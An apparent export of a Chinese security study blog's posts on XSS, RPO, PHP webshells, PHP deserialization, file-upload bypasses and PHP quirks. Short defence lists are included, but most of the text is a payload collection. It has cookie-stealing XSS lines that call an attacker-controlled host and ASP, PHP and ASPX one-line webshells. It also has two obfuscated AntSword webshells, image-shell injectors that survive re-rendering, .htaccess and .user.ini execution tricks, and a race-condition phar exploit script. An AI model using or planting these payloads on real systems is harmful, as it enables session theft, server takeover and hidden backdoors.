title="XSS的防御措施"></a>XSS的防御措施</h4><p>（1）编码：对输入内容的特定字符进行编码，例如表示html标记的 &lt; &gt; 等符号<br>（2）过滤：移除用户上传的DOM属性，如onerror等，移除用户上传的style节点，script节点，iframe节点等。<br>（3）校正：避免直接对HTML Entity编码，使用DOM Prase转换，校正不配对的DOM标签。<br>（4）配置：对重要的cookie设置httpOnly, 防止客户端通过document.cookie读取 cookie<br>（5）不要使用Eval来解析并运行不确定的数据或代码，对于JSON解析请使用 JSON.parse()<br>方法。</p><h4 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h4><pre><code>&lt;script&gt;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&lt;/script&gt;&lt;script&gt;var img = document.createElement(&quot;img&quot;);img.src = &quot;http://你的公网ip:端口号/?cookie=&quot;+document.cookie;&lt;/script&gt;&lt;script&gt;window.location.href=&#39;http://你的公网ip:端口号/&#39;+document.cookie&lt;/script&gt;&lt;script&gt;location.href=&#39;http://你的公网ip:端口号/&#39;+document.cookie&lt;/script&gt;&lt;input onfocus=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot; autofocus&gt;&lt;svg onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;&lt;iframe onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;</code></pre><h3 id="RPO-攻击"><a href="#RPO-攻击" class="headerlink" title="RPO 攻击"></a>RPO 攻击</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>由于<strong>Apache 服务器对编码后的 url 不能正常解析，而 Nginx 却可以正常解析。</strong><br>（Apache 服务器不能解析%2f 是默认配置问题，可见：链接包含”%2F”导致mod_rewrite失效）<br>假设现在有2个目录分别为aaa目录和bbb目录，利用浏览器与服务器对特殊构造的url的解析差异<br>能够让获取了aaa目录下的文件的浏览器误以为自己在bbb目录。<br>当aaa下的文件出现了相对路径的文件引用的时候，浏览器会去读取bbb目录下的该文件，从而造成了漏洞的产生。<br>目前来看此攻击方法依赖于浏览器和网络服务器的反应<br>基于服务器的Web缓存技术和配置差异，以及服务器和客户端浏览器的解析差异<br>利用前端代码中加载的css/js的相对路径来加载其他文件<br>最终浏览器将服务器返回的不是css/js的文件当做css/js来解析<br>从而导致XSS，信息泄露等漏洞产生。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句话木马</title>
      <link href="/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
      <url>/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马"></a>什么是一句话木马</h4><p>  一句话木马是一种短小精悍的恶意代码，通常只有一行之长。<br>  这种木马可以以上传文件、修改配置等方式将恶意代码植入到受害者服务器上<br>  然后通过一些特殊手法在服务器端执行，以达到入侵控制目的。</p><h4 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a>常见的一句话木马</h4><p>我们接触的一句话木马大多为这种，它需要在PHP环境中才可使用</p><pre><code>&lt;?php @eval($_POST[cmd]);  ?&gt;</code></pre><h4 id="木马原理"><a href="#木马原理" class="headerlink" title="木马原理"></a>木马原理</h4><pre><code>（1）$_POST[cmd]    $_POST 是 PHP 中的一个超全局变量，POST方式提交的所有变量，都会保存在此数组中，变量名即为键名（2）eval()    eval() 函数在 PHP 中用于执行字符串中的代码并返回执行结果。    该函数对php语法要求严格，所传入语句必须以&quot; ; &quot;号结尾（3）@    符号@的作用是屏蔽该语句的报错信息    如果站点PHP版本&gt;=8.0的话会报错（4）脉络梳理    用eval函数，将我们post方式提交的名为cmd的变量，当做PHP代码执行，cmd变量可为任何攻击代码</code></pre><h4 id="可用于条件竞争的一句话木马"><a href="#可用于条件竞争的一句话木马" class="headerlink" title="可用于条件竞争的一句话木马"></a>可用于条件竞争的一句话木马</h4><pre><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])；  ?&gt;&#39; ); ?&gt;</code></pre><p>这段代码是用来创建一个名为shell.php的文件，并在其中写入一段代码。<br>这段代码的作用是接受一个POST请求中的cmd参数，并将其作为PHP代码执行。</p><h4 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h4><p><strong>木马内容</strong></p><pre><code>GIF89a&lt;?php @eval($_POST[cmd])；  ?&gt; //GIF89a 为了绕过可能存在的MIME头检测</code></pre><p><strong>.htaccess文件</strong></p><pre><code>&lt;FilesMatch &quot;jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;//大体意思是设置当前目录所有带jpg的文件名都使用php解析//无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行</code></pre><p><strong>.user.ini扩展文件</strong></p><pre><code>auto_prepend_file=shell.jpg //意思就是当前目录中的php文件的页头会自动去包含shell.jpg中的文件内容//auto_append_file 是页尾包含</code></pre><h4 id="一句话木马收集"><a href="#一句话木马收集" class="headerlink" title="一句话木马收集"></a>一句话木马收集</h4><p>ASP一句话木马：</p><pre><code>&lt;% execute(request(&quot;value&quot;)) %&gt;</code></pre><p>PHP一句话木马：</p><pre><code>&lt;?php @eval($_POST[&#39;value&#39;]); ?&gt;</code></pre><p>变形后的PHP一句话木马：</p><pre><code>&lt;?php  $x = $_GET[&#39;z&#39;];  @eval(&quot;$x;&quot;);?&gt;</code></pre><p>ASPX一句话木马：</p><pre><code>&lt;%@ Page Language=&quot;Jscript&quot; %&gt;&lt;% eval(Request.Item[&quot;value&quot;]) %&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2023/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>在各类语言中，将对象的状态信息转换为可存储或可传输的过程就是序列化<br>序列化的逆过程就是便是反序列化，主要是为了方便对象传输。<br>为了完整安全地将对象保存到文件或数据库中，或者在网络上传输对象，就需要使用序列化。</p><p>不同类型数据序列化之后的形式:</p><pre><code>$number = 34;$float = 11.11111;$str = &#39;user&#39;;$bool = true;$null = NULL;$arr = array(&#39;a&#39; =&gt; 10, &#39;b&#39; =&gt; 200);$test = new TEST(&#39;uu&#39;, true);$test2 = new TEST(&#39;uu&#39;, true);$test2-&gt;data = &amp;$test2-&gt;data2;i:34;d:11.11111;s:4:&quot;user&quot;;b:1;N;a:2:&#123;s:1:&quot;a&quot;;i:10;s:1:&quot;b&quot;;i:200;&#125;O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:5:&quot;data2&quot;;s:9:&quot;dazzhuang&quot;;s:10:&quot;TESTpass&quot;;b:1;&#125;O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:9:&quot;dazzhuang&quot;;s:5:&quot;data2&quot;;R:2;s:10:&quot;TESTpass&quot;;b:1;&#125;只序列化成员函数，不序列化成员方法私有属性的序列化加上类名并且在成员函数前后加上空(url编码的%00)对象内调用对象时序列化后显示为套娃形式</code></pre><p>反序列化之后:</p><pre><code>只实例化new之后object(test)#1 (3) &#123;  [&quot;a&quot;]=&gt;                      // public  string(6) &quot;benben&quot;  [&quot;b&quot;:protected]=&gt;            // protected  int(666)  [&quot;c&quot;:&quot;test&quot;:private]=&gt;       // private  bool(false)&#125;反序列化的过程只看序列化链，不管存不存在这个类反序列化不触发成员方法，也不改变类的成员方法</code></pre><p><strong>魔术方法是什么？</strong><br>是一个预定义好的，在特定情况下自动触发的方法<br><strong>魔术方法有什么作用？</strong><br>反序列化过程中，代码通过调用方法，触发代码执行<br><strong>魔术方法需要了解什么？</strong><br>触发时机、触发优先级、功能、参数、返回值</p><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>反序列化过程中，unserialize()接收的值 (字符串)可控<br>通过更改这个值 (字符串)，得到所需要的代码，即生成的对象的属性值</p><h4 id="魔术方法全解"><a href="#魔术方法全解" class="headerlink" title="魔术方法全解"></a>魔术方法全解</h4><pre><code>（1）  __construct()触发时机: 实例化对象后立即触发功能: 提前清理不必要内容参数: 非必要返回值特点: 序列化和反序列化时不会触发（2）  __destruct()触发时机: 销毁对象时立即触发功能: 关闭文件、释放结果集参数: 不能带有任何参数特点: 序列化时不会触发（3）  __sleep()触发时机: 序列化serialize()之前功能: 返回需要被序列化存储的成员属性，删除不必要的属性参数: 成员属性返回值: 需要被序列化存储的成员属性（4）  __wakeup()触发时机: 反序列化unserialize()之前功能: 重新建立数据库连接或执行其他初始化操作参数: 不能带有任何参数特点: 序列化时不会触发（5）  __toString()触发时机: 对象被当成字符串调用时功能: 以字符串表示对象，可以自定义格式，常用于构造pop链参数: 不能带有任何参数（6）  __invoke()触发时机: 尝试以调用函数的方式调用一个对象时功能: 将一个对象像函数一样调用，在对象上下文中实现函数式编程参数: 可以接受任意数量的参数（7）  __call()触发时机: 调用一个不存在的方法时参数: 可传参返回值: 调用的不存在的方法的名称和参数（8）  __callStatic()触发时机: 静态调用或调用成员常量时使用的方法不存在时参数: 可传参返回值: 调用的不存在的方法的名称和参数（9）  __get()触发时机: 访问不存在或不可访问的属性时参数: 可传参返回值:不存在的成员属性的名称和赋的值（10）  __set()触发时机: 给不存在或不可访问的属性赋值时参数: 可传参返回值: 不存在的成员属性的名称和赋的值（11）  __isset()触发时机: 对不可访问属性使用isset()或empty()时参数: 可传参返回值: 不存在的成员属性的名称（12）  __unset()触发时机: 对不可访问属性使用unset()时参数: 可传参返回值: 不存在的成员属性的名称（13）  __clone()触发时机: 当使用clone拷贝完成一个对象后，新对象会自动调用（14）  __set_state()触发时机: 使用var_export()函数导出一个对象时，或者使用eval()函数导入一个对象时参数: 只有一个参数(数组)，包含对象的状态信息。键是对象的属性名，值是对象的属性值。功能: 用于返回一个对象的状态数组特点: 只能在类中定义，不能在对象中定义（15）  __autoload()触发时机: 使用未定义的类时，或者使用未加载的类时功能: 根据类名动态加载对应的类文件，并定义对应的类参数: 只有一个参数，即要加载的类名特点: PHP 7.2.0及以上版本中，__autoload()魔术方法已被废弃，推荐使用spl_autoload_register()（16）  __debugInfo()触发时机: 在使用var_dump()函数打印对象时功能: 被var_dump()函数输出一个数组，包含对象的调试信息参数: 没有参数</code></pre><h4 id="POP链前置知识"><a href="#POP链前置知识" class="headerlink" title="POP链前置知识"></a>POP链前置知识</h4><p><strong>POP是什么？</strong><br>在反序列化中，我们能控制的数据就是对象中的属性值<br>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的种payload<br><strong>POC是什么？</strong><br>POC (Proof of concept)又称概念验证，可以理解成漏洞验证程序<br>POC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码<br><strong>如何分析POP链？</strong><br>最好使用反推法！<br>1.找到可利用的函数<br>2.根据参数的传递与调用反推出哪个变量需要是什么<br>3.分析判断有哪些魔术方法可以被利用以及如何被调用<br><strong>如何利用漏洞？</strong><br><img src="https://s2.loli.net/2023/04/16/wSFIaq7h4Ol32tg.png" alt="POP链构造例子"><br><strong>构造如下:</strong><br><img src="https://s2.loli.net/2023/04/16/iSj1gtLHqTQaNsx.png" alt="POP链构造例子解析"></p><h4 id="字符串逃逸——增多"><a href="#字符串逃逸——增多" class="headerlink" title="字符串逃逸——增多"></a>字符串逃逸——增多</h4><p>字符串以<code>;&#125;</code>结束，后面的不看<br>空（N）不算在内</p><p><img src="https://s2.loli.net/2023/04/17/qd4L8MtOH2bPKQk.png" alt="字符串增多例题01"><br><img src="https://s2.loli.net/2023/04/17/jS5ActwNfYMXhbx.png" alt="字符串增多例题02"></p><h4 id="字符串逃逸——减少"><a href="#字符串逃逸——减少" class="headerlink" title="字符串逃逸——减少"></a>字符串逃逸——减少</h4><p><img src="https://s2.loli.net/2023/04/18/71zLkKi9cTGwZho.png" alt="字符串减少例题01"><br><img src="https://s2.loli.net/2023/04/18/KbeAu2j7RMiWCkT.png" alt="字符串减少02例题"></p><h4 id="weakup魔术方法绕过"><a href="#weakup魔术方法绕过" class="headerlink" title="weakup魔术方法绕过"></a>weakup魔术方法绕过</h4><p>反序列化漏洞:<br>CVE-2016-7124<br>漏洞产生原因:<br>如果存在wakeup方法则反序列化前先调用wakeup方法<br>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup()<br>如果同时还有正则表达式匹配可以用+6代替6<br>记得url编码</p><h4 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h4><p><img src="https://s2.loli.net/2023/04/18/SQVydNngi8rAEkm.png" alt="前置知识"><br><img src="https://s2.loli.net/2023/04/18/mXDo6Qh9V4KF58E.png" alt="PHP存储时"><br><img src="https://s2.loli.net/2023/04/18/bKH46heyWJgDrlw.png" alt="PHP_serialize存储时"><br><img src="https://s2.loli.net/2023/04/18/JRzB3V9TbdjMsUP.png" alt="PHP_binary存储时（少见）"><br><img src="https://s2.loli.net/2023/04/18/xcVBeOpRk5vQPG1.png" alt="漏洞成因及其利用"></p><h4 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p><img src="https://s2.loli.net/2023/04/18/uJm29U1KoICiXl3.png" alt="phar反序列化前置知识"><br><img src="https://s2.loli.net/2023/04/18/ujNiJdK79YUWPyS.png" alt="phar文件结构"><br><img src="https://s2.loli.net/2023/04/18/RDSGLEqZCg3szPv.png" alt="漏洞原理"><br><img src="https://s2.loli.net/2023/04/18/ZsUD1jKMyVeimF4.png" alt="漏洞利用条件"><br>注:<br>（1）phar文件只看文件内容，不看后缀名<br>（2）使用时利用伪协议phar://文件名读取该文件</p><h4 id="其它反序列化链"><a href="#其它反序列化链" class="headerlink" title="其它反序列化链"></a>其它反序列化链</h4><p>找到该框架的版本以及其所用的序列化链<br>从网上找到POC直接利用就行</p><h4 id="使用条件竞争执行phar反序列化"><a href="#使用条件竞争执行phar反序列化" class="headerlink" title="使用条件竞争执行phar反序列化"></a>使用条件竞争执行phar反序列化</h4><pre><code>import requestsimport threadingimport base64url = &#39;&#39;f = open(&#39;./phar.phar&#39;, &#39;rb&#39;)data = f.read()flag = Falsedef work1():    requests.post(url=url+&quot;?fn=a&quot;, data=data)def work2():    global flag    r = requests.post(url=url+&quot;?fn=phar://phar.phar/&quot;, data=&quot;&quot;)    if &quot;flag&#123;&quot; in r.text and flag is False:        print(base64.b64encode(r.text.encode()))        flag = Truewhile flag is False:    a = threading.Thread(target=work1)    b = threading.Thread(target=work2)    a.start()    b.start()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/04/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/04/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件上传存在的漏洞一般有：</p><pre><code>类型限制绕过：Web应用程序对上传文件的类型进行限制，黑名单或白名单方式              攻击者可通过在请求包中伪造Content-Type字段或使用特定的文件扩展名的方式绕过限制，上传恶意文件。文件名欺骗：攻击者通过修改上传文件的文件名，绕过文件类型检测，从而上传恶意文件。目录遍历：攻击者通过在上传文件的路径中使用../等符号，绕过应用程序的安全限制，成功上传文件到其他目录。权限提升：攻击者上传恶意文件，通过漏洞提升权限，获取更高的系统权限。二进制文件上传：攻击者上传二进制文件到服务器，通过漏洞执行恶意代码。</code></pre><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>操作木马文件提权 获取网站权限</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>burp抓包勤快点，多上传马，慢慢测试过滤规则，多积累木马。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>【绕过前端检测】</p><ol><li>禁用JS</li><li>更改前端文件</li><li>更改文件后缀</li></ol><p>【后端校验文件类型】<br>将Content-Type内容修改成image/png</p><p>【后端检测文件后缀 · 黑名单】</p><pre><code>上传.user.ini        // auto_prepend_file = 1.jpg或者.htaccess        // AddType application/x-httpd-php .jpg上传木马并更改为合法后缀和文件类型</code></pre><p>【文件内容过滤】</p><pre><code>先使用二分法确定过滤了什么东西1. 后缀名不完整 .php5 .phtml等绕过2. 在数据包中文件后缀名前加空格3. 使用phP绕过对php的检测4. 上传.htacess文件5. 末尾加上::$DATA6. 双写pphphp绕过7. 末尾加空格绕过8. 0x00截断上传9. 末尾加.绕过10. %00截断上传11. 后缀名前加.12. MINE绕过&lt;? echo &#39;123&#39;;?&gt;                               //short_open_tags=on&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;    //无限制&lt;% echo &#39;123&#39;;%&gt;                               //asp_tags=on php_version &lt; 7&lt;script language=”php”&gt;echo &#39;123&#39;; &lt;/script&gt;   //php_vsesion &lt; 7可以用&#123;&#125;代替[]过滤了()，那就用反引号&#39;对log过滤了使用lo&quot;.&quot;g绕过</code></pre><p>【未循环验证】<br>可以使用x.php..类似的方法</p><p>【UA注入日志包含】</p><pre><code>上传完.user.ini        // auto_append_file=&quot;1.png&quot;再上传图片             // &lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;访问网站然后修改ua头信息</code></pre><p>【文件头检测】</p><pre><code>增加对应的文件头GIF文件:  GIF89APNG文件:  89 50 4E 47 0D 0A 1A 0A</code></pre><p>【远程包含文件】</p><pre><code>使用  https://www.bejson.com/convert/ip2int/  将IP转换为纯数字&lt;?=include&#39;http://IP转换/&#39;&gt;</code></pre><p>【条件竞争】<br>session包含，前文已经详细写过，不再重复描述。</p><p>【图片二次渲染】<br>将木马插入到图片中，类似于图片马<br>脚本放在文末</p><p>【getimagesize 绕过】<br>getimagesize() 获取上传文件信息，图片马绕过</p><p>【exif_imagetype 绕过】<br>getimagesize() 获取上传文件信息，图片马绕过</p><p>【文件大小检测】<br>拒绝传入太小或太大的文件，控制文件大小，建议使用图片马</p><p>【Apache陌生后缀解析漏洞】<br>Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。<br>Apache认为应该从右到左开始判断解析方法的。<br>如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。</p><h4 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h4><ol><li>后端验证：采用服务端验证模式</li><li>后缀验证：基于白名单，黑名单过滤</li><li>MIME验证：基于上传自带类型艰检测</li><li>内容检测：文件头，完整性检测</li><li>自带函数过滤</li><li>WAF防护软件：宝塔、云盾等</li></ol><p>蚁剑生成的shell脚本</p><pre><code>      // 连接密码: 123&lt;?php $qdjZ=create_function(chr(0x1cf-0x1ab).str_rot13(&#39;f&#39;).chr(0x15009/0x307).chr(228-119).str_rot13(&#39;r&#39;),base64_decode(&#39;ZQ==&#39;).chr(104076/882).str_rot13(&#39;n&#39;).chr(651-543).chr(01545-01475).base64_decode(&#39;JA==&#39;).chr(90045/783).chr(0xca0e/0x1d2).str_rot13(&#39;z&#39;).chr(810-709).str_rot13(&#39;)&#39;).chr(29028/492));$qdjZ(base64_decode(&#39;Njc5M&#39;.&#39;jMzO0&#39;.&#39;BldkF&#39;.&#39;sKCRf&#39;.&#39;&#39;.base64_decode(&#39;VQ==&#39;).base64_decode(&#39;RQ==&#39;).str_rot13(&#39;9&#39;).chr(0xbe50/0x244).chr(390-304).&#39;&#39;.&#39;&#39;.str_rot13(&#39;S&#39;).chr(0157503/0761).str_rot13(&#39;k&#39;).base64_decode(&#39;TQ==&#39;).chr(01077-0725).&#39;&#39;.&#39;NdKTs&#39;.&#39;yMDM3&#39;.&#39;Njk5O&#39;.&#39;w==&#39;.&#39;&#39;));?&gt;      // 连接密码: TyKPuntU&lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#39;bw==&#39;).base64_decode(&#39;bQ==&#39;).base64_decode(&#39;ZQ==&#39;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#39;YQ==&#39;).base64_decode(&#39;bA==&#39;).chr(060340/01154).chr(01041-0775).base64_decode(&#39;cw==&#39;).str_rot13(&#39;b&#39;).chr(01504-01327).base64_decode(&#39;ZQ==&#39;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#39;NjgxO&#39;.&#39;Tc7QG&#39;.&#39;V2QWw&#39;.&#39;oJF9Q&#39;.&#39;&#39;.str_rot13(&#39;G&#39;).str_rot13(&#39;1&#39;).str_rot13(&#39;A&#39;).base64_decode(&#39;VQ==&#39;).str_rot13(&#39;J&#39;).&#39;&#39;.&#39;&#39;.chr(0x304-0x2d3).base64_decode(&#39;Ug==&#39;).chr(13197/249).str_rot13(&#39;F&#39;).base64_decode(&#39;MQ==&#39;).&#39;&#39;.&#39;B1bnR&#39;.&#39;VXSk7&#39;.&#39;MjA0N&#39;.&#39;TkxOw&#39;.&#39;==&#39;.&#39;&#39;));?&gt;</code></pre><p>PNG二次渲染脚本</p><pre><code>&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#39;1.png&#39;);  //要修改的图片的路径/*木马内容   &lt;?$_GET[0]($_POST[1]);?&gt;   */?&gt;建议使用已经渲染过一次的文件写入木马，防止文件改动过大。</code></pre><p>JPG二次渲染脚本</p><pre><code>&lt;?php    $miniPayload = &quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;;    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;        die(&#39;php-gd is not installed&#39;);    &#125;    if(!isset($argv[1])) &#123;        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) &#123;            die(&#39;Incorrect SOI marker&#39;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() === 0xFF) &#123;                            if($dis-&gt;readByte !== 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;                    die(&#39;Success!&#39;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#39;payload_&#39;.$argv[1]);    die(&#39;Something\&#39;s wrong&#39;);    function checkImage($filename, $data, $unlink = FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes = (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) &#123;            $this-&gt;binData = &#39;&#39;;            $this-&gt;order = $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);                $this-&gt;binData = file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData = $filename;            &#125;            $this-&gt;size = strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData = substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#39;End Of File&#39;);            &#125;            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#39;End Of File&#39;);            &#125;            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        &#125;    &#125;?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP特性</title>
      <link href="/2023/04/12/PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2023/04/12/PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>积累各种函数，PHP语法特性，从中发现漏洞<br>要求深入了解PHP语言并熟练使用其函数。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【PHP比较运算符一览表】$a == $b      等于       true，如果类型转换后 $a 等于 $b。$a === $b     全等       true，如果 $a 等于 $b，并且它们的类型也相同。$a != $b      不等       true，如果类型转换后 $a 不等于 $b。$a &lt;&gt; $b      不等       true，如果类型转换后 $a 不等于 $b。$a !== $b     不全等     true，如果 $a 不等于 $b，或者它们的类型不同。$a &lt; $b       小与       true，如果 $a 严格小于 $b。$a &gt; $b       大于       true，如果 $a 严格大于 $b。$a &lt;= $b      小于等于   true，如果 $a 小于或者等于 $b。$a &gt;= $b      大于等于   true，如果 $a 大于或者等于 $b。$a &lt;=&gt; $b     太空船运算符（组合比较符）   当$a小于、等于、大于 $b时 分别返回一个小于、等于、大于0的 int 值。当两个操作对象都是数字字符串，或一个是数字另一个是数字字符串，就会自动按照数值进行比较。当比较时用的是 === 或 !==， 则不会进行类型转换(因为不仅要对比数值，还要对比类型)【preg_match 函数】preg_match()返回 pattern的匹配次数。 因为preg_match()在第一次匹配后将会停止搜索，所以它的值将是0次（不匹配）或1次因为preg_match函数无法处理数组，所以可以通过数组的方式绕过^表示匹配行头，$表示匹配行尾，i表示大小写都匹配，m表示多行匹配当^$一起的时候表示精准匹配，需要行首行尾都要有【intval 函数】通过使用指定的进制 base 